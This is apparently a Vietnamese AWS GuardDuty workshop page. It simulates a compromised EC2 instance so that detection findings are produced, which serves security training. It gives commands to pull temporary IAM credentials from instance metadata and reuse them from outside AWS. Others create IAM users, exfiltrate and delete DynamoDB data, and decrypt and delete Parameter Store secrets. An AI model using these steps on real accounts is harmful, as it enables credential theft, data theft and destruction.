---
title : "Tạo các Finding"
date: 2024-01-01
weight : 1
chapter : false
pre : " <b> 6.1 </b> "
---

**Tạo ra Finding một cách thủ công**

Các cuộc tấn công giả lập và Findings sẽ được tự động tạo ra từ CloudFormation Template, ngoài trừ một Finding. Đối với Finding này, bạn sẽ cần phải làm một số bước cụ thể như:
1. Sao chép IAM security credential tạm thời từ EC2 instance.
2. Thực hiện gọi API từ máy tính cá nhân một cách thủ công.

> Để tạo ra Finding này, chúng ta phải thực hiện gọi API đến từ bên ngoài hệ thống mạng của AWS.

**Nội dung**
- [Truy xuất IAM security credential tạm thời với Systems Manager](#truy-xuất-iam-security-credential-tạm-thời-với-systems-manager)
- [Tạo AWS CLI Profile trên máy tính cá nhân](#tạo-aws-cli-profile-trên-máy-tính-cá-nhân)
- [Thực hiện câu lệnh AWS CLI bằng IAM security credential tạm thời](#thực-hiện-câu-lệnh-aws-cli-bằng-iam-security-credential-tạm-thời)

#### Truy xuất IAM security credential tạm thời với Systems Manager

Để tiến hành giả lập cuộc tấn công cuối cùng này, bạn cần phải truy xuất thành công IAM security credential tạm thời được sinh ra bởi IAM role thuộc EC2 instance. Chúng ta có thể thử 1 trong 2 cách sau:
1. Truy cập SSH vào EC2 instance và tiến hành truy vấn dữ liệu **Metadata** của EC2 instance.
2. Sử dụng chức năng **Session Manager** của dịch vụ AWS System Manager.
   1. Truy cập vào System Manager Console ở **us-west-2**.
   2. Ở thanh điều hướng bên tay trái, chọn **Fleet Manager**, chúng ta sẽ thấy một *managed EC2 instance* với định dạng tên như sau - `GuardDuty-Example: Compromised Instance: Scenario 3` với trạng thái **SSM Agent ping status** là `Online`.

![6-system-manager-fleet-manager](/images/6-system-manager-fleet-manager.png?featherlight=false&width=90pc)

   3. Tiến hành sử dụng chức năng **Session Manager** bằng cách nhấn nút `Instance actions` và chọn `Start Session`.

![system-manager-fleet-manager-start-session](/images/6-system-manager-fleet-manager-start-session.png?featherlight=false&width=90pc)

   4. Thực hiện câu lệnh truy vấn dữ liệu **Metadata**:

   ```bash
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GuardDuty-Example-EC2-Compromised
   ```

3. Tiến hành ghi chú một số thông tin quan trọng sau
   1. **Access Key ID**
   2. **Secret Access Key**
   3. **Session Token**

![system-manager-instance-session-start](/images/6-system-manager-instance-session-start.png?featherlight=false&width=90pc)

#### Tạo AWS CLI Profile trên máy tính cá nhân

Sau khi thành công truy xuất IAM security credential tạm thời, chúng ta sẽ tiến hành tạo một **AWS CLI Profile** trên máy tính cá nhân. Từ Terminal/CMD/PowerShell, chúng ta tiến hành thay thế các `<PLACEHOLDER>` với giá trị cụ thể đã thu thập, sau đó thực hiện nhập các lệnh sau:

```bash
aws configure set profile.badbob.region us-west-2
aws configure set profile.badbob.aws_access_key_id <ACCESS_KEY_ID>
aws configure set profile.badbob.aws_secret_access_key <SECRET_ACCESS_KEY>
aws configure set profile.badbob.aws_session_token <SESSION_TOKEN>
```

> Chúng ta có thể kiểm tra xem nếu Profile đã được tạo hay chưa bằng việc truy cập đến [nơi chứa các **AWS security credentials**](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html#cli-configure-files-where).

Chúng ta có thể sử dụng câu lệnh sau để tiến hành kiểm tra nhanh xem đã có **AWS CLI Profile** tên là `badbob` hay chưa.

```bash
aws configure --profile badbob
```

![aws-cli-configure-profile](/images/6-aws-cli-configure-profile.png?featherlight=false&width=90pc)

#### Thực hiện câu lệnh AWS CLI bằng IAM security credential tạm thời
Bằng các câu lệnh **AWS CLI** dưới đây, chúng ta tiến hành thực hiện gọi API đến những dịch vụ AWS khác nhau.

---
**IAM user có bất kỳ quyền hạn nào?**

```bash
aws iam get-user --profile badbob
aws iam create-user --user-name Chuck --profile badbob
```

---
**Liệu có quyền truy cập đến DynamoDB?**

```bash
aws dynamodb list-tables --profile badbob
aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB --profile badbob
```

---
**Liệu có quyền truy vấn dữ liệu đến DynamoDB?**

```bash
aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile badbob
aws dynamodb put-item --table-name GuardDuty-Example-Customer-DB --item '{"name":{"S":"Joshua Tree"},"state":{"S":"Michigan"},"website":{"S":"https://www.nps.gov/yell/index.htm"}}' --profile badbob
aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile badbob
aws dynamodb delete-table --table-name GuardDuty-Example-Customer-DB --profile badbob
aws dynamodb list-tables --profile badbob
```

---
**Liệu có thể truy cập đến System Manager Parameter Store?**

```bash
aws ssm describe-parameters --profile badbob
aws ssm get-parameters --names "gd_prod_dbpwd_sample" --profile badbob
aws ssm get-parameters --names "gd_prod_dbpwd_sample" --with-decryption --profile badbob
aws ssm delete-parameter --name "gd_prod_dbpwd_sample" --profile badbob
```
